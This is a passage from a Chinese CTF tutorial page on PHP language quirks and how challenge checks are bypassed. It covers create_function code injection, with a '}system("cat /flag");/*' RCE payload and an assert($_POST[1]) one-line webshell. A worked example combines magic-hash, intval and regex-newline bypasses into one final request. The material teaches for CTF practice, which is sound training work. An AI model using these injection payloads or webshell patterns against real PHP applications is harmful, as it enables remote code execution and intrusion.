+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nv">$f</span> <span class="o">=</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">'$a'</span><span class="p">,</span> <span class="s1">'return $a;'</span><span class="p">);</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="k">echo</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">"hi"</span><span class="p">);</span>  <span class="c1">// hi</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="c1">// 注入：$code 可控时闭合函数体即可执行任意代码</span>
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="nv">$g</span> <span class="o">=</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">'$a'</span><span class="p">,</span> <span class="s1">'}phpinfo();/*'</span><span class="p">);</span>
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="nv">$g</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">// 实际执行 phpinfo()</span>
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>因为函数体被拼成 <code>function __lambda($a) { }phpinfo();/* }</code>，<code>}</code> 提前闭合函数，后面的代码在函数定义时即被执行。题目若用 <code>create_function($_GET['arg'], $_GET['code'])</code> 且过滤不严格，传 <code>?arg=&amp;code=}system("cat /flag");/*</code> 即可 RCE。这类"字符串拼接进 eval 上下文"的思路与 RCE 章节的 <code>assert</code>、<code>preg_replace /e</code> 一脉相承。</p>
+<h3 id="_13">其他历史考点速览<a class="headerlink" href="#_13" title="Permanent link">¶</a></h3>
+<ul>
+<li><code>assert("...")</code>：PHP 7 前接受字符串参数并 eval 执行，常用于一句话木马：<code>assert($_POST[1])</code>；</li>
+<li><code>preg_replace</code> 的 <code>/e</code> 修饰符（PHP 5.5 移除）：替换结果会被当作 PHP 代码执行；</li>
+<li><code>call_user_func</code> / <code>array_map</code> 等回调函数：第一个参数可控时等于任意函数调用；</li>
+<li><code>money_format</code>、<code>IntlChar</code> 等冷门函数偶尔用于无字母数字 RCE 构造。</li>
+</ul>
+<h2 id="_14">例题：综合演练<a class="headerlink" href="#_14" title="Permanent link">¶</a></h2>
+<p>下面这道综合题串起了本章的多个考点，也是真实比赛中"签到难度"PHP 特性题的典型长相：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>  <span class="c1">// $flag = "flag{php_features_master}";</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'b'</span><span class="p">];</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="nv">$d</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'d'</span><span class="p">];</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="c1">// 第一关：a 和 b 不能相等，但 MD5 要"相等"</span>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="nv">$b</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"a 和 b 不能相等"</span><span class="p">);</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="k">if</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$b</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"md5 要相等"</span><span class="p">);</span>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="c1">// 第二关：c 不能是字符串 "1024"，但 intval 后要严格等于 1024</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">===</span> <span class="s2">"1024"</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"不许直接传 1024"</span><span class="p">);</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="k">if</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">1024</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"c 要等于 1024"</span><span class="p">);</span>
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="c1">// 第三关：d 里必须出现 flag，但结尾不能是 flag</span>
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="s2">"flag"</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"d 要包含 flag"</span><span class="p">);</span>
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag$/"</span><span class="p">,</span> <span class="nv">$d</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"结尾不能是 flag"</span><span class="p">);</span>
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a>
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>逐步分析：</p>
+<p><strong>第一关</strong>：<code>$a == $b</code> 为假，但 <code>md5($a) != md5($b)</code> 为假。比较用的是松散的 <code>!=</code>，所以魔术哈希有效——找两个不同的字符串，MD5 都是 <code>0e</code> 开头：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="err">GET /?a=QNKCDZO&amp;b=240610708</span>
+</code></pre></div>
+<p><code>md5("QNKCDZO")</code> 是 <code>0e8304...</code>，<code>md5("240610708")</code> 是 <code>0e4620...</code>，两者按科学计数法都等于 <code>0</code>，松散比较相等，过关。</p>
+<p><strong>第二关</strong>：<code>$c === "1024"</code> 是严格字符串比较，而 <code>intval($c) !== 1024</code> 也是严格比较。<code>intval</code> 只取字符串开头的数字部分，所以只要开头是 <code>1024</code>、整体不等于字符串 <code>"1024"</code> 即可：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="err">GET /?c=1024abc</span>
+</code></pre></div>
+<p><code>intval("1024abc") === 1024</code> 成立，<code>"1024abc" === "1024"</code> 不成立，过关。<code>1024.0</code>、<code>+1024</code>、<code>1024e0</code> 也都是合法答案。</p>
+<p><strong>第三关</strong>：<code>strpos</code> 要求包含 <code>flag</code>，正则 <code>/flag$/</code> 禁止以 <code>flag</code> 结尾。注意 <code>$</code> 在默认模式下匹配的是"字符串末尾或末尾换行之前"，并不能锚定中间内容——所以只要 <code>flag</code> 后面跟任意字符即可：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="err">GET /?d=flag%0ax</span>
+</code></pre></div>
+<p><code>d</code> 为 <code>"flag\nx"</code>：包含 <code>flag</code>，<code>strpos</code> 过关；<code>flag</code> 不在结尾，正则匹配失败，过关。</p>
+<p>最终 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nf">GET</span> <span class="nn">/?a=QNKCDZO&amp;b=240610708&amp;c=1024abc&amp;d=flag%0ax</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+<p>回顾解题路径：第一关用 <strong>魔术哈希</strong>，第二关用 <strong><code>intval</code> 截断 **，第三关用</strong> 正则锚点语义 <strong>。PHP 特性题的核心方法就是：</strong> 逐条列出条件，确定每个条件对应哪个特性，然后用最小 payload 逐个击破**。遇到不确定的函数行为，本地 <code>php -r 'var_dump(intval("1024abc"));'</code> 跑一遍，永远比猜快。</p>
+<h2 id="_15">小结<a class="headerlink" href="#_15" title="Permanent link">¶</a></h2>
+<p>本章覆盖了 PHP 特性题的六块基石：</p>
+<ul>
+<li>弱类型比较：<code>==</code> 的类型转换、魔术哈希、数组打函数、<code>strcmp</code>/<code>in_array</code>/<code>switch</code>/<code>intval</code> 的坑；</li>
+<li>自增特性：从 <code>"Array"</code> 出发构造任意字符串，支撑无字母数字 RCE；</li>
+<li>标签变体：<code>&lt;?=</code> 始终可用、文件尾 <code>?&gt;</code> 可省略；</li>
+<li>变量覆盖：<code>$$</code>、<code>extract</code>、<code>parse_str</code> 三件套；</li>
+<li>伪协议：<code>php://filter</code> 读源码、<code>php://input</code> 执行 POST 体、<code>data://</code> 内联数据、<code>phar://</code> 触发反序列化；</li>
+<li>正则与历史函数：<code>%00</code> 截断、换行绕过、回溯上限、<code>create_function</code> 注入。</li>
+</ul>
+<p>做题时的心态建议：遇到可疑比较先想类型转换，遇到函数参数先想传数组，遇到过滤先想编码和协议。剩下的交给实践——去 Web入门题单 里找几道 PHP 特性题练手，比把本文背下来有用得多。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../sensitive_info/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 敏感信息泄露"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        敏感信息泄露
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../php_basic/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: PHP基础"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        PHP基础
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#php">PHP特性与常见绕过</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_1">弱类型比较</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">== 与 ===</a>
+        
+      </li>
+    
+      <li>
+        <a href="#0e-md5">0e 开头 MD5 碰撞（魔术哈希）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">数组绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#strcmp-in_array">strcmp 与 in_array 的漏洞</a>
+        
+      </li>
+    
+      <li>
+        <a href="#switch-intval">switch 与 intval 的坑</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#php_1">PHP 自增特性与字母数字绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_4">闭合标签与短标签</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">可变变量与变量覆盖</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_6">可变变量 $$</a>
+        
+      </li>
+    
+      <li>
+        <a href="#extract">extract()</a>
+        
+      </li>
+    
+      <li>
+        <a href="#parse_str">parse_str()</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">变量覆盖防护结论</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_8">伪协议总览</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#phpfilter">php://filter</a>
+        
+      </li>
+    
+      <li>
+        <a href="#phpinput">php://input</a>
+        
+      </li>
+    
+      <li>
+        <a href="#data">data://</a>
+        
+      </li>
+    
+      <li>
+        <a href="#phar">phar://</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_9">正则绕过</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#00">%00 截断</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_10">换行绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_11">回溯上限绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_12">换行与数组补充</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#each-create_function">each 与 create_function 等历史函数考点</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#each">each()</a>
+        
+      </li>
+    
+      <li>
+        <a href="#create_function">create_function()</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_13">其他历史考点速览</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_14">例题：综合演练</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_15">小结</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
